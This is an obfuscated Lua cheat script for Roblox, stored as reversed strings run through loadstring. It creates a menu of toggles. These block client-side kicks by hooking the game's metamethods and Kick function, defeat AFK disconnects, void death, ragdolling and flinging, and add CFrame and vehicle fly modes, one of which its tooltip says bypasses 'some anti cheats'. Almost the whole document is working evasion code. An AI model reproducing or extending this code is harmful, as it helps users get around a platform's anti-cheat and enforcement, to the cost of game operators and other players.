,".sresu enohp rof tseB .nottub eht woleb ti fo daetsni IU rekcip roloc eht sretneC" = pitloot	
,tpircs = xobpuorg	
,"rekciprolocretnec" = emarf	
{(elggoTetaerC.G_







)}
,dne	
)3 ,"!tluafed ot teser sgnittes IU"(yfitoN.G_		

dne		
dne			
)552 ,321 ,0(BGRmorf.3roloC = 3roloCdnuorgkcaB.emarFroloc				
neht emarFroloc fi			
)"roloC"(dlihCtsriFdniF:iuGneercs = emarFroloc lacol			
			

eslaf = rekciProloCretneC.G_			
			

dne			
dne				
dne					
"00.3 / 00.1" = txeT.txet						
 )0 ,1 ,0 ,333.0(wen.2miDU = eziS.raBllif						
neht txet dna raBllif fi					

)"rabllif"(dlihCtsriFdniF:emarFredils dna emarFredils = raBllif lacol					
)"txet"(dlihCtsriFdniF:nottub = txet lacol					
)"emarFredils"(dlihCtsriFdniF:nottub = emarFredils lacol					
neht nottub fi				
)"nottub"(dlihCtsriFdniF:emarFezispitloot = nottub lacol				
neht emarFezispitloot fi			
)"ezispitloot"(dlihCtsriFdniF:tneraP.tpircs = emarFezispitloot lacol			
			

dne			
00.1 = elacS.elacSpitloot				
neht elacSpitloot fi			
)"elacSIU"(ssalCfOdlihCtsriFdniF:pitloot dna pitloot = elacSpitloot lacol			
)"pitlooT"(dlihCtsriFdniF:iuGneercs = pitloot lacol			
			

dne			
dne				
dne					
"00.1" = txeT.xobtxet						
neht xobtxet fi					
)"xobtxet"(dlihCtsriFdniF:emarFxobtxet = xobtxet lacol					
neht emarFxobtxet fi				
)"ezisiug"(dlihCtsriFdniF:emarFezisiug = emarFxobtxet lacol				
neht emarFezisiug fi			
)"ezisiug"(dlihCtsriFdniF:tneraP.tpircs = emarFezisiug lacol			
			

dne			
00.1 = elacS.elacSiu				
neht elacSiu fi			
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol			
			

dne			
dne				
dne					
"01 / 5" = txeT.txet						
)0 ,1 ,0 ,5.0(wen.2miDU = eziS.raBllif						
neht txet dna raBllif fi					

)"rabllif"(dlihCtsriFdniF:emarFredils dna emarFredils = raBllif lacol					
)"txet"(dlihCtsriFdniF:nottub = txet lacol					
)"emarFredils"(dlihCtsriFdniF:nottub = emarFredils lacol					
neht nottub fi				
)"nottub"(dlihCtsriFdniF:emarFezistxet = nottub lacol				
neht emarFezistxet fi			
)"ezistxet"(dlihCtsriFdniF:tneraP.tpircs = emarFezistxet lacol			
			

dne			
dne				
dne					
]jbo[seziSlanigiro = eziStxeT.jbo						
neht ]jbo[seziSlanigiro fi					
neht )"xoBtxeT"(AsI:jbo ro )"nottuBtxeT"(AsI:jbo ro )"lebaLtxeT"(AsI:jbo fi				
od ))(stnadnecseDteG:iuGneercs(sriap ni jbo ,_ rof			
			
neht iuGneercs fi		

dne		
tneraP.iuGneercs = iuGneercs			
od )"iuGneercS"(AsI:iuGneercs ton dna iuGneercs elihw		
tneraP.tpircs = iuGneercs lacol		
		

)dne		
))ataDgifnoC.G_(edocnENOSJ:ecivreSpttH ,"nosj.gifnocym"(elifetirw			
)(noitcnuf(llacp		
)"ecivreSpttH"(ecivreSteG:emag = ecivreSpttH lacol		
		

}		
0 = a			
,552 = b			
,321 = g			
,0 = r			
{ = ]"emehtrolociug_emehtrolociug"[ataDgifnoC.G_		
		

eslaf = ]"rekciprolocretnec"[ataDgifnoC.G_		
		

1 = ]"ezispitloot"[ataDgifnoC.G_		
		

"00.1" = ]"ezisiug_ezisiug"[ataDgifnoC.G_		
		

5 = ]"ezistxet"[ataDgifnoC.G_		
		
)(noitcnuf = kcabllac	
,5.1 = tiaWmrifnoc	
,"...niaga sserp esaelP" = egasseMmrifnoc	
,eurt = mrifnoCsdeen	
,".tluafed rieht ot sgnitteS IU steseR" = pitloot	
,tpircs = xobpuorg	
,"tluafedteser" = emarf	
{(nottuBetaerC.G_






















)}
dne	
dne		
eulav = elacS.elacSiu			
neht elacSiu fi		
)eulav(noitcnuf = kcabllac	
,eurt = pans	
,2 = secalplamiced	
,1 = tluafed	
,3 = eulavxam	
,".00.1 = tluafeD .ti edih yletelpmoc ot 0 ot teS .sezis pitloot stsujdA" = pitloot	
,tpircs = xobpuorg	
,"ezispitloot" = emarf	
{(redilSetaerC.G_

)"elacSIU"(ssalCfOdlihCtsriFdniF:pitloot dna pitloot = elacSiu lacol
)"pitlooT"(dlihCtsriFdniF:iuGneercs = pitloot lacol

dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol














dne
dne	
dne		
tneraP.p = p			
dne			
kaerb				
eulav = elacS.elacSiu				
dne				
p = tneraP.elacSiu					
)"elacSIU"(wen.ecnatsnI = elacSiu					
neht elacSiu ton fi				
)"elacSIU"(ssalCfOdlihCtsriFdniF:p = elacSiu lacol				
neht )"iuGneercS"(AsI:p fi			
od p elihw		
tneraP.tpircs = p lacol		

001 / )5.0 + 001 * eulav(roolf.htam = eulav		
)05.2 ,07.0 ,eulav(pmalc.htam = eulav		
neht eulav fi	
)elacSdevas(rebmunot = eulav lacol	
neht elacSdevas fi
]"ezisiug_ezisiug"[ataDgifnoC.G_ = elacSdevas lacol
)1.0(tiaw.ksat


)}
dne	
dne		
tneraP.p = p			
dne			
kaerb				
eulav = elacS.elacSiu				
dne				
p = tneraP.elacSiu					
)"elacSIU"(wen.ecnatsnI = elacSiu					
neht elacSiu ton fi				
)"elacSIU"(ssalCfOdlihCtsriFdniF:p = elacSiu lacol				
				

dne				
dne					
dne						
)eulav ,"f2.%"(tamrof.gnirts = txeT.xobtxet							
neht xobtxet fi						
)"xobtxet"(dlihCtsriFdniF:emarFxobtxet = xobtxet lacol						
neht emarFxobtxet fi					
)"ezisiug"(dlihCtsriFdniF:emarf = emarFxobtxet lacol					
neht emarf fi				
)"ezisiug"(dlihCtsriFdniF:tneraP.tpircs = emarf lacol				
				
neht )"iuGneercS"(AsI:p fi			
od p elihw		
tneraP.tpircs = p lacol		
		

001 / )5.0 + 001 * eulav(roolf.htam = eulav		
		

)05.2 ,07.0 ,eulav(pmalc.htam = eulav		
		

dne nruter neht eulav ton fi		

)txet(rebmunot = eulav lacol		
)txet(noitcnuf = kcabllac	
,eurt = rolocrevoh	
,"roloCemarf" = rolocxobtxet	
,".05.2 = xaM ,07.0 = niM .ezis IUG eht selacS" = pitloot	
,"ezisiug" = emanxobtxet	
,"ezisiug" = emarf	
{(xobtxeTetaerC.G_







)}
dne	
dne		
dne			
dne				
tesffo + ]jbo[seziSlanigiro = eziStxeT.jbo					
5 - eulav = tesffo lacol					
					

dne					
eziStxeT.jbo = ]jbo[seziSlanigiro						
neht ]jbo[seziSlanigiro ton fi					
					
neht )"xoBtxeT"(AsI:jbo ro )"nottuBtxeT"(AsI:jbo ro )"lebaLtxeT"(AsI:jbo fi				
od ))(stnadnecseDteG:iuGneercs(sriap ni jbo ,_ rof			
neht iuGneercs fi		

dne		
tneraP.iuGneercs = iuGneercs			
od )"iuGneercS"(AsI:iuGneercs ton dna iuGneercs elihw		
tneraP.tpircs = iuGneercs lacol		
)eulav(noitcnuf = kcabllac	
,eurt = pans	
,0 = secalplamiced	
,5 = tluafed	
,01 = eulavxam	
,0 = eulavnim	
,"5 = tluafeD .ezis txet eht tsujdA" = pitloot	
,tpircs = xobpuorg	
,"ezistxet" = emarf	
{(redilSetaerC.G_

}{ = seziSlanigiro lacol












dne
)(eziSetadpu	
dne	
)eziSetadpu(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu		
neht elacSiu fi	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)eziSetadpu(tcennoC:)"eziStnetnoCetulosbA"(langiSdegnahCytreporPteG:tuoyaLtsiLiu	
dne	
)thgieHdelacs ,0 ,tesffO.X.eziS.xobpuorg ,elacS.X.eziS.xobpuorg(wen.2miDU = eziS.xobpuorg		
elacs / )2 + Y.eziStnetnoc( = thgieHdelacs lacol		
1 ro elacS.elacSiu dna elacSiu = elacs lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		
eziStnetnoCetulosbA.tuoyaLtsiLiu = eziStnetnoc lacol		
)(eziSetadpu noitcnuf lacol	
neht tuoyaLtsiLiu fi
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
xobpuorg = p lacol	
)(iuGneercSteg noitcnuf lacol
)"tuoyaLtsiLIU"(ssalCfOdlihCtsriFdniF:xobpuorg = tuoyaLtsiLiu lacol
tneraP.tpircs = xobpuorg lacol

xobtxeTetaerC.G_ dna elggoTnottuBetaerC.G_ dna nottuBetaerC.G_ dna elggoTetaerC.G_ litnu )(tiaw.ksat taeper]]):reverse())();
end;
task.spawn(C_c0);
local function C_114()
local script = _llza[_sc(49,49,52)];
loadstring(([[
)}
dne	
dne		
dne			
lin = noitcennoCkcabkconk				
)(tcennocsiD:noitcennoCkcabkconk				
neht noitcennoCkcabkconk fi			
			
esle		
)dne			
orez.3rotceV = yticoleVralugnAylbmessA.prh				
)0 ,Y.yticoleVraeniLylbmessA.prh ,0(wen.3rotceV = yticoleVraeniLylbmessA.prh				
				

dne nruter neht prh ton fi				
)"traPtooRdionamuH"(dlihCtsriFdniF:retcarahc = prh lacol				

dne nruter neht retcarahc ton fi				
retcarahC.reyalPlacoL = retcarahc lacol				

dne nruter neht ]"kcabkconk"[ataDgifnoC.G_ ton fi				
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = noitcennoCkcabkconk			
			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".kcabkconk gnitteg morf retcarahc ruoy stneverP" = pitloot	
,tpircs = xobpuorg	
,"kcabkconk" = emarf	
{(elggoTetaerC.G_

lin = noitcennoCkcabkconk lacol

)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol
reyalPlacoL.sreyalP = reyalPlacoL lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol




)}
dne	
dne		
dne			
lin = cnmmhdlo				
)dne				
)cnmmhdlo ,"llaceman__" ,emag(dohtematemkooh					
)(noitcnuf(llacp				
neht dohtematemkooh dna cnmmhdlo fi			

dne			
lin = immhdlo				
)dne				
)immhdlo ,"xedni__" ,emag(dohtematemkooh					
)(noitcnuf(llacp				
neht dohtematemkooh dna immhdlo fi			

dne			
lin = noitcnuFkciKdlo				
)dne				
)noitcnuFkciKdlo ,kciK.reyalPlacoL(noitcnufkooh					
)(noitcnuf(llacp				
neht noitcnufkooh dna noitcnuFkciKdlo fi			
			
esle		
)dne			
)... ,fles(cnmmhdlo nruter				
dne				
nruter					
neht "kcik" == )(rewol:)(dohtemllacemanteg dna reyalPlacoL == fles fi				
)... ,fles(noitcnuf ,"llaceman__" ,emag(dohtematemkooh = cnmmhdlo			

)dne			
)dohtem ,fles(immhdlo nruter				
dne				
)2 ,"kciK noitcnuf rebmem gnillac '.' ton ':' detcepxE"(rorre nruter					
neht "kcik" == )(rewol:dohtem dna reyalPlacoL == fles fi				
)dohtem ,fles(noitcnuf ,"xedni__" ,emag(dohtematemkooh = immhdlo			

dne			
)dne )(noitcnuf ,kciK.reyalPlacoL(noitcnufkooh = noitcnuFkciKdlo				
neht noitcnufkooh fi			

dne nruter neht dohtematemkooh ton fi			
			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".seussi gal esuac thgim siht gnilbanE .emag eht fo tuo uoy gnikcik morf skcik tneilc ylno stneverP" = pitloot	
,tpircs = xobpuorg	
,"kcik" = emarf	
{(elggoTetaerC.G_

lin = noitcnuFkciKdlo lacol
lin = cnmmhdlo lacol
lin = immhdlo lacol

reyalPlacoL.sreyalP = reyalPlacoL lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol




)}
dne	
dne		
dne			
lin = noitcennoCdesuaPkrowten				
)(tcennocsiD:noitcennoCdesuaPkrowten				
neht noitcennoCdesuaPkrowten fi			
			
esle		
)dne			
)(yortseD:]"esuaPkrowteN/stpircSeroC"[iuGxolboR.iuGeroC				
)(noitcnuf(llacp			
			

)dne			
dne				
)(yortseD:jbo					
neht "esuaPkrowteN/stpircSeroC" == emaN.jbo fi				
)jbo(noitcnuf(tcennoC:deddAdlihC.iuGxolboR.iuGeroC = noitcennoCdesuaPkrowten			

)dne			
dne				
)(tcennocsiD:noitcennoCdesuaPkrowten					
neht noitcennoCdesuaPkrowten fi				
)(noitcnuf(llacp			
			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".segassem 'desuaP yalpemaG' selbasiD" = pitloot	
,tpircs = xobpuorg	
,"desuapyalpemag" = emarf	
{(elggoTetaerC.G_

lin = noitcennoCdesuaPkrowten lacol
)"iuGeroC"(ecivreSteG:emag = iuGeroC lacol




)}
dne	
dne		
005- = thgieHyortseDstraPnellaF.ecapskrow			
			

dne			
lin = noitcennoCdiov				
)(tcennocsiD:noitcennoCdiov				
neht noitcennoCdiov fi			
			
esle		
)dne			
dne				
0/0 = thgieHyortseDstraPnellaF.ecapskrow					
neht 0/0 =~ thgieHyortseDstraPnellaF.ecapskrow fi				

dne nruter neht ]"diov"[ataDgifnoC.G_ ton fi				
)(noitcnuf(tcennoC:)"thgieHyortseDstraPnellaF"(langiSdegnahCytreporPteG:ecapskrow = noitcennoCdiov			
			

0/0 = thgieHyortseDstraPnellaF.ecapskrow			
			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".diov eht ni gniyd morf uoy selbasiD" = pitloot	
,tpircs = xobpuorg	
,"diov" = emarf	
{(elggoTetaerC.G_

lin = noitcennoCdiov lacol




)}
dne	
dne		
dne			
dne				
)eurt ,nwoDgnillaF.epyTetatSdionamuH.munE(delbanEetatSteS:dionamuh					
)eurt ,llodgaR.epyTetatSdionamuH.munE(delbanEetatSteS:dionamuh					
neht dionamuh fi				
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol				
neht retcarahc fi			
retcarahC.reyalPlacoL = retcarahc lacol			

dne			
lin = noitcennoCllodgar				
)(tcennocsiD:noitcennoCllodgar				
neht noitcennoCllodgar fi			
			
esle		
)dne			
dne				
)pUgnitteG.epyTetatSdionamuH.munE(etatSegnahC:muh					
neht nwoDgnillaF.epyTetatSdionamuH.munE == )(etatSteG:muh					
ro llodgaR.epyTetatSdionamuH.munE == )(etatSteG:muh fi				
				

dne				
dne					
dne						
eslaf = delbanE.trap							
neht lin == )"D6rotoM"(ssalCfOrotsecnAtsriFdniF:trap fi						
neht )"tniartsnoCegniH"(AsI:trap ro )"tniartsnoCtekcoSllaB"(AsI:trap fi					
od ))(stnadnecseDteG:rhc(sriap ni trap ,_ rof				
				

dne nruter neht muh ton fi				
)"dionamuH"(ssalCfOdlihCtsriFdniF:rhc = muh lacol				

dne nruter neht rhc ton fi				
retcarahC.reyalPlacoL = rhc lacol				

dne nruter neht ]"llodgar"[ataDgifnoC.G_ ton fi				
)(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = noitcennoCllodgar			
			

dne			
dne				
)eslaf ,nwoDgnillaF.epyTetatSdionamuH.munE(delbanEetatSteS:dionamuh					
)eslaf ,llodgaR.epyTetatSdionamuH.munE(delbanEetatSteS:dionamuh					
neht dionamuh fi				
)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahc = dionamuh lacol				
neht retcarahc fi			
retcarahC.reyalPlacoL = retcarahc lacol			
			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".gnillodgar morf retcarahc ruoy stneverP" = pitloot	
,tpircs = xobpuorg	
,"llodgar" = emarf	
{(elggoTetaerC.G_

lin = noitcennoCllodgar lacol

)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol
reyalPlacoL.sreyalP = reyalPlacoL lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol




)}
dne	
dne		
dne			
dne				
dne					
dne						
eurt = edilloCnaC.trap							
neht )"traPesaB"(AsI:trap fi						
od ))(stnadnecseDteG:retcarahC.reyalp(sriap ni trap ,_ rof					
neht retcarahC.reyalp dna reyalPlacoL =~ reyalp fi				
od ))(sreyalPteG:sreyalP(sriap ni reyalp ,_ rof			
			

dne			
lin = noitcennoCgnilFitna				
)(tcennocsiD:noitcennoCgnilFitna				
neht noitcennoCgnilFitna fi			
			
esle		
)dne			
dne				
dne					
dne						
dne							
eslaf = edilloCnaC.trap								
neht )"traPesaB"(AsI:trap fi							
od ))(stnadnecseDteG:retcarahC.reyalp(sriap ni trap ,_ rof						
neht retcarahC.reyalp dna reyalPlacoL =~ reyalp fi					
od ))(sreyalPteG:sreyalP(sriap ni reyalp ,_ rof				

dne nruter neht ]"gnilf"[ataDgifnoC.G_ ton fi				
)(noitcnuf(tcennoC:deppetS.ecivreSnuR = noitcennoCgnilFitna			

dne			
)(tcennocsiD:noitcennoCgnilFitna				
neht noitcennoCgnilFitna fi			
			

dne			
dne				
dne					
dne						
eslaf = edilloCnaC.trap							
neht )"traPesaB"(AsI:trap fi						
od ))(stnadnecseDteG:retcarahC.reyalp(sriap ni trap ,_ rof					
neht retcarahC.reyalp dna reyalPlacoL =~ reyalp fi				
od ))(sreyalPteG:sreyalP(sriap ni reyalp ,_ rof			
			
			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".gnulf gnitteg morf uoy tneverp ot sreyalp rehto htiw noisilloc selbasiD" = pitloot	
,tpircs = xobpuorg	
,"gnilf" = emarf	
{(elggoTetaerC.G_

lin = noitcennoCgnilFitna lacol

)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol
reyalPlacoL.sreyalP = reyalPlacoL lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol




)}
dne	
dne		
dne			
lin = noitcennoCkfa				
)noitcennoCkfa(lecnac.ksat				
neht noitcennoCkfa fi			
			
esle		
)dne			
dne				
)06(tiaw.ksat					
))(wen.2rotceV(2nottuBkcilC:resUlautriv					
)(rellortnoCerutpaC:resUlautriv					
)"resUlautriV"(ecivreSteG:emag = resUlautriv lacol					
od ]"kfa"[ataDgifnoC.G_ dna delbanEsi elihw				
)(noitcnuf(nwaps.ksat = noitcennoCkfa			
			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".setunim 02 rof KFA gnieb morf gnitcennocsid morf uoy stneverP" = pitloot	
,tpircs = xobpuorg	
,"kfa" = emarf	
{(elggoTetaerC.G_

lin = noitcennoCkfa lacol






dne
)(eziSetadpu	
dne	
)eziSetadpu(tcennoC:)"elacS"(langiSdegnahCytreporPteG:elacSiu		
neht elacSiu fi	
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol	
)eziSetadpu(tcennoC:)"eziStnetnoCetulosbA"(langiSdegnahCytreporPteG:tuoyaLtsiLiu	
dne	
)thgieHdelacs ,0 ,tesffO.X.eziS.xobpuorg ,elacS.X.eziS.xobpuorg(wen.2miDU = eziS.xobpuorg		
elacs / )2 + Y.eziStnetnoc( = thgieHdelacs lacol		
1 ro elacS.elacSiu dna elacSiu = elacs lacol		
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol		
eziStnetnoCetulosbA.tuoyaLtsiLiu = eziStnetnoc lacol		
)(eziSetadpu noitcnuf lacol	
neht tuoyaLtsiLiu fi
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
xobpuorg = p lacol	
)(iuGneercSteg noitcnuf lacol
)"tuoyaLtsiLIU"(ssalCfOdlihCtsriFdniF:xobpuorg = tuoyaLtsiLiu lacol
tneraP.tpircs = xobpuorg lacol

nwodporDetaerC.G_ dna redilSetaerC.G_ dna xobtxeTetaerC.G_ dna elggoTnottuBetaerC.G_ dna nottuBetaerC.G_ dna elggoTetaerC.G_ litnu )(tiaw.ksat taeper]]):reverse())();
end;
task.spawn(C_114);
local function C_179()
local script = _llza[_sc(49,55,57)];
loadstring(([[)}
dne	
dne		
mun = deepsFC			
neht mun fi		
)txet(rebmunot = mun lacol		
)txet(noitcnuf = kcabllac	
,eurt = rolocrevoh	
,"roloCemarf" = rolocxobtxet	
,".ylf emarfC fo deeps eht stsujdA" = pitloot	
,"regnahCylFC" = emanxobtxet	
,"ylFC" = emarf	
{(xobtxeTetaerC.G_
)}
dne	
dne		
eslaf = derohcnA.daeH			
)"daeH"(dlihCroFtiaW:retcarahC.rekaeps = daeH lacol			
eslaf = dnatSmroftalP.)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahC.rekaeps			
dne )(tcennocsiD:poolFC neht poolFC fi			
esle		
)dne			
)yticoleVecapStcejbo(wen.emarFC * )noitisoParemac - emarFCaremac( * )noitisoPdaeh(wen.emarFC = emarFC.daeH				
)noitceriDevom(ecapStcejbOoTrotceV:))Z.noitisoPdaeh ,Y.noitisoParemac ,X.noitisoPdaeh(wen.3rotceV ,noitisoParemac(wen.emarFC = yticoleVecapStcejbo lacol				
noitisoP.emarFCdaeh = noitisoPdaeh lacol				
noitisoP.emarFCaremac = noitisoParemac lacol				
)1 + Z.tesffOaremac- ,Y.tesffOaremac- ,X.tesffOaremac-(wen.emarFC * emarFCaremac = emarFCaremac				
noitisoP.)emarFCaremac(ecapStcejbOoT:emarFCdaeh = tesffOaremac lacol				
emarFC.aremac = emarFCaremac lacol				
aremaCtnerruC.ecapskrow = aremac lacol				
emarFC.daeH = emarFCdaeh lacol				
)emiTatled * deepsFC( * noitceriDevoM.)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahC.rekaeps = noitceriDevom lacol				
)emiTatled(noitcnuf(tcennoC:taebtraeH.ecivreSnuR = poolFC			
dne )(tcennocsiD:poolFC neht poolFC fi			
eurt = derohcnA.daeH			
)"daeH"(dlihCroFtiaW:retcarahC.rekaeps = daeH lacol			
eurt = dnatSmroftalP.)"dionamuH"(ssalCfOdlihCtsriFdniF:retcarahC.rekaeps			
neht delbanEsi fi		
reyalPlacoL.sreyalP = rekaeps lacol		
)delbanEsi(noitcnuf = kcabllac	
,".staehc itna emos gnissapyb ,dnuora ylf ot uoy swollA" = pitloot	
,tpircs = xobpuorg	
,"ylFC" = emarf	
{(elggoTetaerC.G_

poolFC lacol
05 = deepsFC




)}
dne	
dne		
mun = deepsylfelcihev			
neht mun fi		
)txet(rebmunot = mun lacol		
)txet(noitcnuf = kcabllac	
,eurt = rolocrevoh	
,"roloCemarf" = rolocxobtxet	
,".ylf elcihev fo deeps eht stsujdA" = pitloot	
,"regnahCylFV" = emanxobtxet	
,"ylFV" = emarf	
{(xobtxeTetaerC.G_
)}
dne	
dne		
dne			
)(YLFVON				
esle			
)(ylfelibomvnu				
neht eliboMnOsI fi			
esle		
dne			
)(YLFV				
esle			
)(ylfelibomv				
neht eliboMnOsI fi			
neht delbanEsi fi		
)delbanEsi(noitcnuf = kcabllac	
,".elcihev a ni elihw dnuora ylf ot uoy swollA" = pitloot	
,tpircs = xobpuorg	
,"ylFV" = emarf	
{(elggoTetaerC.G_

dne
dne	
)dne )(yortseD:)emaNreldnaHorygv(dlihCtsriFdniF:toor )(noitcnuf(llacp		
)dne )(yortseD:)emaNreldnaHyticolevv(dlihCtsriFdniF:toor )(noitcnuf(llacp		
neht toor fi	
)retcarahC.reyalPlacoL(tooRteg = toor lacol	
dne lin = pUyeKylfv )(tcennocsiD:pUyeKylfv neht pUyeKylfv fi	
dne lin = nwoDyeKylfv )(tcennocsiD:nwoDyeKylfv neht nwoDyeKylfv fi	
eslaf = GNIYLFv	
)(YLFVON noitcnuf lacol

dne
)dne	
dne		
0 = E.LORTNOC neht Q.edoCyeK.munE == edoCyeK.tupni fiesle		
0 = Q.LORTNOC neht E.edoCyeK.munE == edoCyeK.tupni fiesle		
0 = R.LORTNOC neht D.edoCyeK.munE == edoCyeK.tupni fiesle		
0 = L.LORTNOC neht A.edoCyeK.munE == edoCyeK.tupni fiesle		
0 = B.LORTNOC neht S.edoCyeK.munE == edoCyeK.tupni fiesle		
0 = F.LORTNOC neht W.edoCyeK.munE == edoCyeK.tupni fi		
dne nruter neht dessecorp fi		
)dessecorp ,tupni(noitcnuf(tcennoC:dednEtupnI.ecivreStupnIresU = pUyeKylfv	

)dne	
dne		
2 * deepsylfelcihev- = E.LORTNOC neht Q.edoCyeK.munE == edoCyeK.tupni fiesle		
2 * deepsylfelcihev = Q.LORTNOC neht E.edoCyeK.munE == edoCyeK.tupni fiesle		
deepsylfelcihev = R.LORTNOC neht D.edoCyeK.munE == edoCyeK.tupni fiesle		
deepsylfelcihev- = L.LORTNOC neht A.edoCyeK.munE == edoCyeK.tupni fiesle		
deepsylfelcihev- = B.LORTNOC neht S.edoCyeK.munE == edoCyeK.tupni fiesle		
deepsylfelcihev = F.LORTNOC neht W.edoCyeK.munE == edoCyeK.tupni fi		
dne nruter neht dessecorp fi		
)dessecorp ,tupni(noitcnuf(tcennoC:nageBtupnI.ecivreStupnIresU = nwoDyeKylfv	

)dne	
)(yortseD:VB		
)(yortseD:GB		
0 = DEEPS		
}0 = E ,0 = Q ,0 = R ,0 = L ,0 = B ,0 = F{ = LORTNOCl		
}0 = E ,0 = Q ,0 = R ,0 = L ,0 = B ,0 = F{ = LORTNOC		
GNIYLFv ton litnu		
emarFC.aremac = emarFC.GB			
dne			
)0 ,0 ,0(wen.3rotceV = yticoleV.VB				
esle			
DEEPS * ))p.emarFC.aremac - )p.)0 ,2.0 * )E.LORTNOC + Q.LORTNOC + B.LORTNOCl + F.LORTNOCl( ,R.LORTNOCl + L.LORTNOCl(wen.emarFC * emarFC.aremac(( + ))B.LORTNOCl + F.LORTNOCl( * rotceVkooL.emarFC.aremac(( = yticoleV.VB				
neht 0 =~ DEEPS dna 0 == )E.LORTNOC + Q.LORTNOC( dna 0 == )B.LORTNOC + F.LORTNOC( dna 0 == )R.LORTNOC + L.LORTNOC( fiesle			
}R.LORTNOC = R ,L.LORTNOC = L ,B.LORTNOC = B ,F.LORTNOC = F{ = LORTNOCl				
DEEPS * ))p.emarFC.aremac - )p.)0 ,2.0 * )E.LORTNOC + Q.LORTNOC + B.LORTNOC + F.LORTNOC( ,R.LORTNOC + L.LORTNOC(wen.emarFC * emarFC.aremac(( + ))B.LORTNOC + F.LORTNOC( * rotceVkooL.emarFC.aremac(( = yticoleV.VB				
neht 0 =~ )E.LORTNOC + Q.LORTNOC( ro 0 =~ )B.LORTNOC + F.LORTNOC( ro 0 =~ )R.LORTNOC + L.LORTNOC( fi			
dne			
0 = DEEPS				
neht 0 =~ DEEPS dna )0 =~ E.LORTNOC + Q.LORTNOC ro 0 =~ B.LORTNOC + F.LORTNOC ro 0 =~ R.LORTNOC + L.LORTNOC( ton fiesle			
05 = DEEPS				
neht 0 =~ E.LORTNOC + Q.LORTNOC ro 0 =~ B.LORTNOC + F.LORTNOC ro 0 =~ R.LORTNOC + L.LORTNOC fi			
aremaCtnerruC.ecapskrow = aremac lacol			
)(tiaw.ksat taeper		
)(noitcnuf(nwaps.ksat	

T = tneraP.VB	
)9e9 ,9e9 ,9e9(wen.3rotceV = ecroFxaM.VB	
)0 ,0 ,0(wen.3rotceV = yticoleV.VB	
T = tneraP.GB	
emarFC.T = emarFC.GB	
)9e9 ,9e9 ,9e9(wen.3rotceV = euqroTxaM.GB	
4e9 = P.GB	
)"yticoleVydoB"(wen.ecnatsnI = VB lacol	
)"oryGydoB"(wen.ecnatsnI = GB lacol	
eurt = GNIYLFv	

0 = DEEPS lacol	
}0 = E ,0 = Q ,0 = R ,0 = L ,0 = B ,0 = F{ = LORTNOCl lacol	
}0 = E ,0 = Q ,0 = R ,0 = L ,0 = B ,0 = F{ = LORTNOC lacol	

dne )(tcennocsiD:pUyeKylfv neht pUyeKylfv fi	
dne )(tcennocsiD:nwoDyeKylfv neht nwoDyeKylfv fi	

dne nruter neht T ton fi	
)rahc(tooRteg = T lacol	
dne nruter neht dionamuh ton fi	
)"dionamuH"(ssalCfOdlihCtsriFdniF:rahc = dionamuh lacol	
)(tiaW:deddAretcarahC.reyalPlacoL ro retcarahC.reyalPlacoL = rahc lacol	
)(YLFV noitcnuf lacol

dne
)dne	
dne		
dne			
))05 * deepsylfelcihev( * Z.noitcerid( * rotceVkooL.emarFC.aremac - yticoleV.reldnaHyticoleV = yticoleV.reldnaHyticoleV				
neht 0 =~ Z.noitcerid fi			
dne			
))05 * deepsylfelcihev( * X.noitcerid( * rotceVthgiR.emarFC.aremac + yticoleV.reldnaHyticoleV = yticoleV.reldnaHyticoleV				
neht 0 =~ X.noitcerid fi			
)(rotceVevoMteG:eludoMlortnoc = noitcerid lacol			
enon3v = yticoleV.reldnaHyticoleV			
emarFetanidrooC.aremac = emarFC.reldnaHoryG			
fni3v = euqroTxaM.reldnaHoryG			
fni3v = ecroFxaM.reldnaHyticoleV			
)emaNreldnaHorygv(dlihCtsriFdniF:toor = reldnaHoryG lacol			
)emaNreldnaHyticolevv(dlihCtsriFdniF:toor = reldnaHyticoleV lacol			
neht )emaNreldnaHorygv(dlihCtsriFdniF:toor dna )emaNreldnaHyticolevv(dlihCtsriFdniF:toor dna toor fi		
aremaCtnerruC.ecapskrow = aremac		
)retcarahC.reyalPlacoL(tooRteg = toor lacol		
)(noitcnuf(tcennoC:deppetSredneR.ecivreSnuR = 2ylfmv	

)dne	
05 = D.gb		
0001 = P.gb		
fni3v = euqroTxaM.gb		
toor = tneraP.gb		
emaNreldnaHorygv = emaN.gb		
